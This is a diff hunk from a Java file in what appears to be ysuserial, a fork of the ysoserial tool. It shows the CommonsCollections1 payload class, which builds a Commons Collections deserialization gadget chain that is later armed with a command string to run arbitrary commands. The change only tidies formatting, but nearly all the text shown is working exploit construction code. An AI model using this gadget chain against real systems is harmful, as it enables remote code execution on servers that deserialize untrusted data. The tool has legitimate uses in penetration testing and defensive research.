@@ -44,20 +44,15 @@ import org.su18.ysuserial.payloads.util.cc.TransformerUtil;
 public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 
 	public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[]{command};
-		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 				new Transformer[]{new ConstantTransformer(1)});
 		// real chain for after setup
 		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
-		final Map innerMap = new HashMap();
-
-		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-
-		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+		final Map               innerMap = new HashMap();
+		final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
+		final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+		final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
